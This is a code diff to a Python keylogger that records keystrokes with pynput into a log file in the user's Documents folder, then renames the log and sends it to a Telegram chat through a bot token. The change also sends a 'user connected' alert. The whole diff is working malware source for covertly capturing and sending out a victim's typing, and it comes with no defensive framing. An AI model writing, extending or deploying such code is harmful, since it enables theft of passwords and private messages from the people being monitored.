@@ -1,24 +1,40 @@
 import os
-import getpass
 from datetime import datetime
 
 import telebot
 from pynput import keyboard
 
+
 token = ''
 chatID = ''
-path = f'C:/Users/{getpass.getuser()}/Documents'
+path = f'C:/Users/{os.getlogin()}/Documents'
 
-def send(filename):
+def send(filename, isfile: bool):
     bot = telebot.TeleBot(token)
-    bot.send_document(chatID, filename)
 
-if os.path.exists(f'{path}/log.txt'):
+    if isfile:
+        file = open(filename, 'rb')
+        bot.send_document(chatID, file)
+        file.close()
+    else:
+        bot.send_message(chatID, f'User {os.getlogin()} connected.')
+
+try:
+    file = open(f'{path}/log.txt')
+    file.close()
+
+except IOError as e:
+    print('No data collected.')
+    print('Starting keylogger...')
+
+else:
     date = datetime.now()
-    name = f'{os.getlogin()} {date.year}-{date.month}-{date.day} {date.hour}:{date.minute}.txt'
+    name = f'{os.getlogin()}_{date.month}-{date.day}-{date.year}_{date.hour}-{date.minute}.txt'
     os.rename(f'{path}/log.txt', name)
-    send(name)
+    send(name, True)
     os.remove(name)
+
+send(0, False)
 
 with open(f'{path}/log.txt', 'w+') as file:
     file.write(f'{os.getlogin()}\n')
